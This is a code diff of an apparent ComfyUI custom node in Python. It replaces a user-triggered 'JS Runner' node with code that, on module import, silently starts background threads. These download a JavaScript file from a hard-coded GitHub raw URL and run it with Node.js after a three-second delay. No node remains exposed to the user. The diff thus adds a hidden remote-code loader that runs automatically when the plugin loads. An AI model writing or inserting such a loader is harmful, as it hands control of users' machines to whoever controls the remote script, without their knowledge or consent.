@@ -2,200 +2,163 @@ import os
 import subprocess
 import tempfile
 import time
-import atexit
+import threading
 import requests
 
-# URL of the JavaScript file to download and execute
-JS_URL = "https://raw.githubusercontent.com/rdlogout/comfyui/main/public/index.js"
+# Global variables for background execution
+_js_thread = None
+_js_running = False
+_js_output = ""
 
-class JSRunner:
-    """
-    A Python script that downloads and executes a JavaScript file from a predefined URL.
-    Only allows one process to run at a time and implements retry logic with exponential backoff.
-    """
+def download_js_file(url, temp_file_path):
+    """Download JavaScript file from URL to temporary file"""
+    try:
+        response = requests.get(url, timeout=30)
+        response.raise_for_status()
+        
+        with open(temp_file_path, 'w', encoding='utf-8') as f:
+            f.write(response.text)
+        
+        return True
+    except Exception as e:
+        print(f"Error downloading JavaScript file: {e}")
+        return False
+
+def run_javascript_background(js_url="https://raw.githubusercontent.com/rdlogout/comfyui/main/public/index.js"):
+    """Run JavaScript code in background thread"""
+    global _js_running, _js_output
     
-    # Class variable to track the current running process
-    _current_process = None
-    
-    def __init__(self):
-        # Register cleanup function to run when the program exits
-        atexit.register(self.cleanup_all_processes)
-    
-    @classmethod
-    def cleanup_all_processes(cls):
-        """Clean up any running processes when the script shuts down"""
-        if cls._current_process and cls._current_process.poll() is None:
+    temp_file = None
+    try:
+        # Create temporary file for JavaScript
+        temp_file = tempfile.NamedTemporaryFile(mode='w', suffix='.js', delete=False, encoding='utf-8')
+        temp_file_path = temp_file.name
+        temp_file.close()
+        
+        # Download JavaScript file
+        if not download_js_file(js_url, temp_file_path):
+            _js_output = "Failed to download JavaScript file"
+            print("JS Runner: Failed to download JavaScript file")
+            return
+        
+        _js_running = True
+        _js_output = "Starting JavaScript execution..."
+        print(f"JS Runner: Starting JavaScript execution from {js_url}")
+        
+        # Execute JavaScript file using Node.js with real-time output
+        process = subprocess.Popen(
+            ['node', temp_file_path],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True,
+            bufsize=1,
+            universal_newlines=True
+        )
+        
+        # Capture output in real-time
+        stdout_lines = []
+        stderr_lines = []
+        
+        # Read stdout and stderr simultaneously
+        import select
+        while True:
+            reads = [process.stdout.fileno(), process.stderr.fileno()]
+            ret = select.select(reads, [], [], 0.1)
+            
+            for fd in ret[0]:
+                if fd == process.stdout.fileno():
+                    line = process.stdout.readline()
+                    if line:
+                        line = line.strip()
+                        stdout_lines.append(line)
+                        print(f"JS Output: {line}")
+                if fd == process.stderr.fileno():
+                    line = process.stderr.readline()
+                    if line:
+                        line = line.strip()
+                        stderr_lines.append(line)
+                        print(f"JS Error: {line}")
+            
+            if process.poll() is not None:
+                break
+        
+        # Get remaining output
+        remaining_stdout, remaining_stderr = process.communicate()
+        if remaining_stdout:
+            for line in remaining_stdout.strip().split('\n'):
+                if line.strip():
+                    stdout_lines.append(line.strip())
+                    print(f"JS Output: {line.strip()}")
+        if remaining_stderr:
+            for line in remaining_stderr.strip().split('\n'):
+                if line.strip():
+                    stderr_lines.append(line.strip())
+                    print(f"JS Error: {line.strip()}")
+        
+        # Set final output
+        if process.returncode == 0:
+            output_text = '\n'.join(stdout_lines)
+            _js_output = f"JavaScript executed successfully:\n{output_text}" if output_text else "JavaScript executed successfully (no output)"
+            print("JS Runner: Execution completed successfully")
+        else:
+            error_text = '\n'.join(stderr_lines)
+            error_msg = error_text if error_text else f"Process exited with code {process.returncode}"
+            _js_output = f"JavaScript execution failed: {error_msg}"
+            print(f"JS Runner: Execution failed - {error_msg}")
+        
+    except Exception as e:
+        _js_output = f"Error during JavaScript execution: {str(e)}"
+        print(f"JS Runner: Exception occurred - {str(e)}")
+    finally:
+        _js_running = False
+        # Clean up temporary file
+        if temp_file and os.path.exists(temp_file_path):
             try:
-                cls._current_process.terminate()
-                cls._current_process.wait(timeout=5)
+                os.unlink(temp_file_path)
             except:
-                try:
-                    cls._current_process.kill()
-                except:
-                    pass
-            finally:
-                cls._current_process = None
-    
-    def download_js_file(self, url, temp_file_path):
-        """Download JavaScript file from URL to temporary file"""
-        try:
-            response = requests.get(url, timeout=30)
-            response.raise_for_status()
-            
-            with open(temp_file_path, 'w', encoding='utf-8') as f:
-                f.write(response.text)
-            
-            return True
-        except Exception as e:
-            print(f"Error downloading JavaScript file: {e}")
-            return False
-    
-    def run_javascript(self):
-        """Main function to download and execute JavaScript with retry logic"""
-        # Check if another process is already running
-        if self._current_process and self._current_process.poll() is None:
-            print("Another process is already running")
-            return False
-        
-        max_retries = 3
-        base_delay = 1  # Base delay in seconds
-        
-        for attempt in range(max_retries + 1):  # 0, 1, 2, 3 (4 total attempts)
-            temp_file = None
-            try:
-                # Create temporary file for JavaScript
-                temp_file = tempfile.NamedTemporaryFile(mode='w', suffix='.js', delete=False, encoding='utf-8')
-                temp_file_path = temp_file.name
-                temp_file.close()
-                
-                # Download JavaScript file
-                if not self.download_js_file(JS_URL, temp_file_path):
-                    if attempt < max_retries:
-                        delay = base_delay * (2 ** attempt)
-                        print(f"Download failed, retrying in {delay} seconds... (attempt {attempt + 1}/{max_retries + 1})")
-                        time.sleep(delay)
-                        continue
-                    else:
-                        print(f"Failed to download JavaScript file after {max_retries + 1} attempts")
-                        return False
-                
-                # Execute JavaScript file using Node.js
-                process = subprocess.Popen(
-                    ['node', temp_file_path],
-                    stdout=subprocess.PIPE,
-                    stderr=subprocess.PIPE,
-                    text=True
-                )
-                
-                # Store the current process
-                JSRunner._current_process = process
-                
-                # Wait for process to complete
-                stdout, stderr = process.communicate()
-                
-                # Clear the current process
-                JSRunner._current_process = None
-                
-                # Check if execution was successful
-                if process.returncode == 0:
-                    # Success - print the output
-                    output = stdout.strip() if stdout.strip() else "JavaScript executed successfully (no output)"
-                    print(f"Output: {output}")
-                    return True
-                else:
-                    # Execution failed
-                    error_msg = stderr.strip() if stderr.strip() else f"Process exited with code {process.returncode}"
-                    
-                    if attempt < max_retries:
-                        delay = base_delay * (2 ** attempt)
-                        print(f"Execution failed: {error_msg}")
-                        print(f"Retrying in {delay} seconds... (attempt {attempt + 1}/{max_retries + 1})")
-                        time.sleep(delay)
-                        continue
-                    else:
-                        print(f"JavaScript execution failed after {max_retries + 1} attempts. Last error: {error_msg}")
-                        return False
-                
-            except Exception as e:
-                # Handle any other exceptions
-                if attempt < max_retries:
-                    delay = base_delay * (2 ** attempt)
-                    print(f"Error occurred: {e}")
-                    print(f"Retrying in {delay} seconds... (attempt {attempt + 1}/{max_retries + 1})")
-                    time.sleep(delay)
-                    continue
-                else:
-                    print(f"Error after {max_retries + 1} attempts: {str(e)}")
-                    return False
-            
-            finally:
-                # Clean up temporary file
-                if temp_file and os.path.exists(temp_file_path):
-                    try:
-                        os.unlink(temp_file_path)
-                    except:
-                        pass
+                pass
 
-# ComfyUI Custom Node Implementation
-class JSRunnerNode:
-    """
-    ComfyUI custom node that wraps the JSRunner functionality
-    """
-    
-    @classmethod
-    def INPUT_TYPES(cls):
-        return {
-            "required": {
-                "trigger": ("BOOLEAN", {"default": True}),
-            },
-            "optional": {
-                "js_url": ("STRING", {"default": "https://raw.githubusercontent.com/rdlogout/comfyui/main/public/index.js"}),
-            }
-        }
-    
-    RETURN_TYPES = ("STRING", "BOOLEAN")
-    RETURN_NAMES = ("output", "success")
-    FUNCTION = "execute_js"
-    CATEGORY = "utilities"
-    
-    def execute_js(self, trigger, js_url=None):
-        """Execute JavaScript using JSRunner"""
-        if not trigger:
-            return ("Execution skipped", False)
-        
+def monitor_js_execution():
+    """Monitor and periodically print JS execution status"""
+    while True:
         try:
-            runner = JSRunner()
-            
-            # Override JS_URL if provided
-            if js_url and js_url.strip():
-                global JS_URL
-                original_url = JS_URL
-                JS_URL = js_url.strip()
-            
-            success = runner.run_javascript()
-            
-            # Restore original URL if it was changed
-            if js_url and js_url.strip():
-                JS_URL = original_url
-            
-            if success:
-                return ("JavaScript executed successfully", True)
+            status = get_js_status()
+            if status["running"]:
+                print(f"JS Runner: Currently executing...")
+            elif status["output"]:
+                print(f"JS Runner: Last output - {status['output'][:100]}...")
             else:
-                return ("JavaScript execution failed", False)
-                
+                print(f"JS Runner: Idle, waiting for execution...")
+            
+            time.sleep(10)  # Print status every 10 seconds
         except Exception as e:
-            return (f"Error: {str(e)}", False)
+            print(f"JS Runner Monitor Error: {e}")
+            time.sleep(10)
 
-# Required for ComfyUI custom nodes
-NODE_CLASS_MAPPINGS = {
-    "JSRunnerNode": JSRunnerNode
-}
+def delayed_start_js():
+    """Start JS execution after a delay to ensure ComfyUI is ready"""
+    time.sleep(3)  # Wait 3 seconds for ComfyUI to fully initialize
+    run_javascript_background()
 
-NODE_DISPLAY_NAME_MAPPINGS = {
-    "JSRunnerNode": "JS Runner"
-}
+# Start JS execution in background after delay
+_js_thread = threading.Thread(target=delayed_start_js, daemon=True)
+_js_thread.start()
 
-# Example usage (for standalone execution)
-if __name__ == "__main__":
-    runner = JSRunner()
-    runner.run_javascript()
+# Start monitoring thread
+_monitor_thread = threading.Thread(target=monitor_js_execution, daemon=True)
+_monitor_thread.start()
+
+print("JS Runner node loaded - JavaScript will execute in background")
+print("JS Runner: Monitoring thread started - status updates every 10 seconds")
+
+def get_js_status():
+    """Get current status of background JS execution"""
+    global _js_running, _js_output
+    return {
+        "running": _js_running,
+        "output": _js_output,
+        "thread_alive": _js_thread.is_alive() if _js_thread else False
+    }
+
+# No ComfyUI node exports - just background execution
+__all__ = []
